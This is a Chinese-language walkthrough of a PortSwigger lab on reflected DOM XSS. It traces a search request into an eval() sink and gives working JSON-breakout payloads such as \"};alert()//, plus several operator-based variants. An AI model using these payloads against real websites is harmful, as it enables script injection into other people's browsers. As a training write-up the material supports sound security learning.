# 实验：反射型 DOM XSS

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected

本实验演示了一种反射型 DOM 漏洞。当服务器端应用程序处理来自请求的数据并将其回显在响应中时，就会发生反射型 DOM 漏洞。随后，页面上的脚本以不安全的方式处理这些反射数据，最终将其写入危险的汇点（sink）。

为了解决本实验，请创建一个能够调用 `alert()` 函数的注入攻击。

## 步骤

探测
- 主页与文章页面均未发现 JS 脚本内容
- 使用搜索功能
    ```http
    GET /?search=g5u12bud HTTP/2
    ```

    - 响应
        ```html
        <script src='/resources/js/searchResults.js'></script>
        <script>
            search('search-results')
        </script>
        ```
        - 加载 JS 文件，并调用其函数

    - `searchResults.js`  
        ```js
        function search(path) {
            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                    eval('var searchResultsObj = ' + this.responseText);
                    displaySearchResults(searchResultsObj);
                }
            };
            xhr.open("GET", path + window.location.search);
            xhr.send();
        ```
        - 源1-客户端 `window.location.search`
        - 源2-服务器 `XMLHttpRequest.responseText`
        - 汇 `eval()`

        - JS 向服务器请求
            ```http
            GET /search-results?search=g5u12bud HTTP/2
            ```
        - 服务器响应 json 数据
            ```json
            {
                "results":[
                ],
                "searchTerm":"g5u12bud"
            }
            ```

测试
- 尝试使用双引号 `"` 逃逸服务器响应的 JSON 字符串
    `search='"]})`
    - 服务器响应
        ```json
        {
            "results": [],
            "searchTerm": "'\"]})"
        }
        ```
        - 服务器恰当转义双引号
- 尝试在双引号前添加作为转义符号的反斜杠 `\` 
    `search=\"`
    - 服务器响应
        ```json
        {
            "results": [],
            "searchTerm": "\\"
            "}
        ```
        - 服务器的转义符被载荷的转义符转义为普通字符，载荷成功逃逸出 JSON

攻击
- 载荷 `search=\"};alert()//` 
    - 构造有效语法：
        - 闭合字符串双引号
        - 闭合 JSON 花括号
        - 使用语句分隔符注入 alert
        - 注释掉残余
    
    - 服务器响应
        ```json
        {
            "results": [],
            "searchTerm": "\\"
        };
        alert()//"}
        ```
    - 成功弹窗

- 其他有效载荷，代替分隔符，仅列举部分
    ```log
    \"}-alert()//
    \"}+alert()//
    \"}&&alert()//
    \"}==alert()//
    \"}|alert()//
    \"}in alert()//
    \"}instanceof alert()//
    ```
    - 二元运算符
        - 加减乘除幂模
        - 逻辑表达式
        - 位运算
        - `in`
        - `instanceof`

- 另一种方式 `\"-alert(1)}//` 调整 JSON 闭合花括号的位置
    - 在 JSON 内，而不是尝试逃逸出 JSON
